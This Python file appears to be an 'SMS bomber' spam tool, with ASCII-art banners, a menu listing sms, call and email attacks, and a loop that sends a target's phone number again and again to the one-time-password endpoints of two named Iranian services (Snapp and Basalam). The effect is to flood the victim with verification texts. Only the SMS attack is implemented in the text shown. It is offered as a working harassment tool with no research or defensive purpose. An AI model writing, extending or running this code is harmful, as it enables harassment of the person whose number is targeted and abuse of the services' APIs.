import requests
import time
import json
import os

# text
class text:
    ## welcome
    def welcome():
        print(text.green+"""
──────────────────████
─────────────────█░░███
─────────────────█░░████
──────────────────███▒██─────████████
────────████████─────█▒█──████▒▒▒▒▒▒████
──────███▒▒▒▒▒▒████████████░░████▒▒▒▒▒███
────██▒▒▒▒░▒▒████░░██░░░░██░░░░░█▒▒▒▒▒▒▒███
───██▒▒░░░░▒██░░░░░█▒░░░░░██▒░░░░░░░▒▒▒▒▒▒█
──██▒░░░░░▒░░░░░░░░░▒░░░░░░░▒▒░░░░░░░▒▒▒▒▒██
──█░░░░░░▒░░░██░░░░░░░░░░░░░██░░░░░░░░▒▒▒▒▒█
──█░░░░░░░░█▒▒███░░░░░░░░░█▒▒███░░░░░░░▒▒▒▒█
──█░░░░░░░████████░░░░░░░████████░░░░░░▒▒▒▒█
──█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█
──██░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▒▒▒▒█
───█░░░░██░█░░░░░░░░░░░░░░░░░░░░░░░███▒▒▒▒▒█
───█▒▒░░░░█████░░░█░░░░██░░░██░░████░▒▒▒▒▒▒█
───██▒▒░░░░░█████████████████████░░░▒▒▒▒▒▒██
────██▒▒▒▒░░░░░██░░░███░░░██░░░█░░░▒▒▒▒▒▒██
─────███▒▒▒░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█████
───────███▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒▒▒████
──────────██████████████████████████

╻ ╻┏━╸╻  ┏━╸┏━┓┏┳┓┏━╸   ╺┳╸┏━┓   ┏━┓┏━┓┏━┓┏┳┓┏┳┓┏━╸┏━┓
┃╻┃┣╸ ┃  ┃  ┃ ┃┃┃┃┣╸     ┃ ┃ ┃   ┗━┓┣━┛┣━┫┃┃┃┃┃┃┣╸ ┣┳┛
┗┻┛┗━╸┗━╸┗━╸┗━┛╹ ╹┗━╸    ╹ ┗━┛   ┗━┛╹  ╹ ╹╹ ╹╹ ╹┗━╸╹┗╸""")

    ## love
    def love():
        print(text.header+"""
────────────────────▒
───────────────────░█
──────────────────███
─────────────────██ღ█
────────────────██ღ▒█──────▒█
───────────────██ღ░▒█───────██
───────────────█ღ░░ღ█──────█ღ▒█
──────────────█▒ღ░▒ღ░█───██░ღღ█
─────────────░█ღ▒░░▒ღ░████ღღღ█
─────░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
─────▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
─────██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
─────██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
────██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
────█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
───██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
───█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
──██ღღ▒████████████ღღ████████████░ღ█▒
──█░ღღ████████████████████████████ღღ█
──█▒ღ██████████████████████████████ღ█
──██ღღ████████████████████████████ღ██
───██ღღ██████████████████████████ღ██
────░██ღღ██████████████████████ღღ██
──────▓██ღ▒██████████████████▒ღ██
─────░──░███ღ▒████████████▒ღ███
──────░░───▒██ღღ████████▒ღ██
─────────────▒██ღ██████ღ██
───────────────██ღ████ღ█
─────────────────█ღ██ღ█
──────────────────█ღღ█
──────────────────█ღ█░
───────────────────██░
"""+text.endc)

    ## colors list
    header = '\033[95m'
    blue = '\033[94m'
    cyan = '\033[96m'
    green = '\033[92m'
    warning = '\033[93m'
    fail = '\033[91m'
    endc = '\033[0m'
    bold = '\033[1m'

    ## status 
    def status(path, message = ""):
        if (path == "+"): return "["+text.green+"*"+text.endc+"] "+text.green+ message +text.endc
        if (path == "*"): return "["+text.warning+"*"+text.endc+"] "+text.warning+ message +text.endc
        if (path == "-"): return "["+text.fail+"*"+text.endc+"] "+text.fail+ message +text.endc
        if (path == "@"): return "["+text.cyan+"*"+text.endc+"] "+text.cyan+ message +text.endc
        if (path == "#"): return "["+text.header+"*"+text.endc+"] "+text.header+ message +text.endc

# spam
class spam:
    ## menu
    def menu():
        print(text.endc+"""
+----------------------------+--------+
|        Reason              | Number |
+----------------------------+--------+
| sms                        |      1 |
+----------------------------+--------+
| call                       |      2 |
+----------------------------+--------+
| email                      |      3 |
+----------------------------+--------+
""")

    ## sms script
    def sms(number,repetition):
        print("\n"+text.status("#")+"Starting to send SMS bombs ...")
        repetition = int(20) if repetition == "" else int(repetition)
        number_of_messages_sent = 0  

        ### sms api
        sms_api = { 0:{"name":"snap","url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone": "+98"+number}},
                    1:{"name":"basalam","url": "https://auth.basalam.com/otp-request","data": {"mobile": "0"+number,"client_id":11}}
                }

        ### spam while
        while repetition > number_of_messages_sent :
            for sms_provider in sms_api:
                time.sleep(6)
                provider_name = sms_api[sms_provider]["name"]
                api_url = sms_api[sms_provider]["url"]
                submission_format = sms_api[sms_provider]["data"]
                send_message = requests.post(api_url,data=submission_format)
                print(text.status("#")+"Send SMS +1 ("+provider_name+") "+text.header+send_message.reason+text.endc)
                number_of_messages_sent+=1

        ### while else        
        else :
            text.love()
            print(text.status("#")+"Messages sent successfully (:")
            input(text.status("@","Press enter to refresh the page "))

# cmd
class cmd:
    ## clear screen
    def clear():
        os.system('clear' if os.name == 'posix' else 'cls')

    ## run command
    def run(path):
        os.system(path)
        